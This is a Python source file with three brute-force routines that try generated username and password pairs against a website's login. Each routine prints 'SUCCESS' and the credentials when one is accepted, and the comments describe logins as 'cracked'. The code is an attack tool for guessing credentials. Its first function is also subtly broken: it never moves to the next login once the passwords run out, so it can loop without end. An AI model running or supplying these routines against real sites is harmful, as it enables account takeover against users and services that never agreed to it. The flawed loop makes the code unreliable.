def try_many_passwords(login_generator, password_generator, query):
    """
    This function tries all passwords for each username.
    :param login_generator: login-generating function
    :param password_generator: password-generating function
    :param query: the function of sending requests to the site
    :return: None
    """
    # getting login and the next login index
    login, next_login_state = login_generator(None)
    next_password_state = None

    while True:
        # getting password and the next password's index
        password, next_password_state = password_generator(next_password_state)
        print(login, password)

        # If the request's response is 200 (OK) - the login and password are cracked:
        if query(login, password):
            print('SUCCESS', login, password)

            # TODO: save current states to avoid starting over in case of program break

            # get the new login, because the previous was cracked
            login, next_login_state = login_generator(next_login_state)

            # for new login starts the new password generating process from the beginning
            password, next_password_state = password_generator(None)

        # if all logins are checked
        if next_login_state is None:
            break


def try_many_logins(login_generator, password_generator, query):
    """
    This function tries all usernames for each password.
    :param login_generator: login-generating function
    :param password_generator: password-generating function
    :param query: the function of sending requests to the site
    :return: None
    """
    next_password_state = None
    while True:

        # getting password and the next password index
        password, next_password_state = password_generator(next_password_state)
        next_login_state = None
        while True:

            # getting login and the next login index
            login, next_login_state = login_generator(next_login_state)
            print(login, password)

            # If the request's response is 200 (OK) - the login and password are cracked:
            if query(login, password):
                print('SUCCESS', login, password)
                break

            # If there is no login left
            if next_login_state is None:
                break

        # If there is no password left
        if next_password_state is None:
            break


def try_many_passwords_limited(login_generator, password_generator, query):
    """
    This function tries all passwords for each username, but using a limited of amount passwords.
    :param login_generator: login-generating function
    :param password_generator: password-generating function
    :param query: the function of sending requests to the site
    :return: None
    """
    # limit of password searching
    password_limit = 100000
    next_login_state = None
    while True:

        # getting login and the next login index
        login, next_login_state = login_generator(next_login_state)
        next_password_state = None

        for i in range(password_limit):

            # getting password and the next password index
            password, next_password_state = password_generator(next_password_state)
            print(login, password)

            # If the request's response is 200 (OK) - the login and password are cracked:
            if query(login, password):
                print(f'SUCCESS!\nUsername: {login}, password: {password}')
                break

            # If there is no password left
            if next_password_state is None:
                break

        # If there is no login left
        if next_login_state is None:
            break
